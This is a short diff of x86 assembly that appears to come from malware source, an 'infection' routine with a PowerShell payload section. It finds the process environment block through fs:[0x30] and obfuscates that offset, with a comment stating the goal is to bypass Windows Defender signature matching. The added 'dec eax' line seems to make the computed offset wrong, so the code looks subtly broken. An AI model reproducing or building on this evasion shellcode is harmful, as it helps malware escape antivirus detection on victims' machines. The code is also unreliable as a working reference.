@@ -33,6 +33,7 @@ infection__data__powershell:
 infection__data:
    pop ebx                      ; get the pointer to the start of the data
    mov eax, 0xFFFFFFCF          ; bypass Windows Defender matching on fs:[0x30]
+   dec eax
    neg eax
    mov eax, [fs:eax]            ; get current PEB
    mov ecx, [eax+0xC]           ; peb->Ldr
